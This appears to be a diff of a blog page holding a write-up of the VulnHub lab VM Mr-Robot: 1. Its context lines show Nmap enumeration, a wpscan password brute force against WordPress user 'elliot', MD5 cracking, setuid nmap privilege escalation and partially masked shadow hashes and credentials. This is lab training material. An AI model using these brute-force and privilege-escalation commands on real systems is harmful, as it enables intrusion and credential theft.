@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20191017_vulnhub-moria11.html"> « </a>📅 published on <code>21/Oct/2019</code><a href="/posts/20191028_vulnhub-node1.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr-Robot: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_mrrobot1/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_mrrobot1/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>, <a href="https://github.com/7h3rAm/writeups#privesc_nmap">privesc_nmap</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Thu Oct 17 15:46:57 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/xml/_quick_tcp_nmap.xml 192.168.92.134
 Nmap scan report for 192.168.92.134
@@ -118,7 +118,7 @@ http://192.168.92.134/key-1-of-3.txt
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested"><code>wordpress: elliot
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We confirm that the username is indeed valid from Wordpress error message for incorrect password. We then use <code>wpscan</code> to bruteforce password for user <code>elliot</code> using the trimmed dictionary file and find a match:  </p>
 <pre class="nested"><code>wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed -U elliot
   [i] Valid Combinations Found:
@@ -132,7 +132,7 @@ http://192.168.92.134/key-1-of-3.txt
 <p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot07b.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot07c.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.5" src="/static/files/posts_vulnhub_mrrobot1/screenshot07d.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>robot@linux&gt; id
 uid=1002(robot) gid=1002(robot) groups=1002(robot)
 robot@linux&gt;  
@@ -156,7 +156,7 @@ bitnamiftp
 mysql
 robot
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. While looking at the <code>/home/</code> directory we find that there is a directory for user <code>robot</code> and this user has access to the second key file <code>key-2-of-3.txt</code>. We have to switch user to access this key file and to do that we need user <code>robot</code>'s password. We also find a word-readable <code>password.raw-md5</code> file within this directory and use Google to find that it is the MD5 hash of the string <code>abcdefghijklmnopqrstuvwxyz</code>. We can now proceed and switch user:  </p>
 <pre class="nested"><code>cat /home/robot/password.raw-md5
   robot:c3fcd3d76192e4007dfb496cca67e13b
@@ -181,7 +181,7 @@ nmap --interactive
 <pre class="nested"><code>cat /root/key-3-of-3.txt
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot10.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5Izn........................
 bitnamiftp:$6$saPiFTAH$7K09sg5oIfkIs5kuMx1R/Um4HNd8O6vF2n8oICEom8VVer0BYATY5wtzdPdP3JeuKbZ4RYBml0THNQv8.........................
@@ -196,7 +196,7 @@ wordpress: elliot/ER28-....
 /home/robot/key-2-of-3.txt: 822c73956184f694993b............
 /root/key-3-of-3.txt: 04787ddef27c3dee1ee16...........
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a>  </li>
 <li><a href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/">http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/</a>  </li>
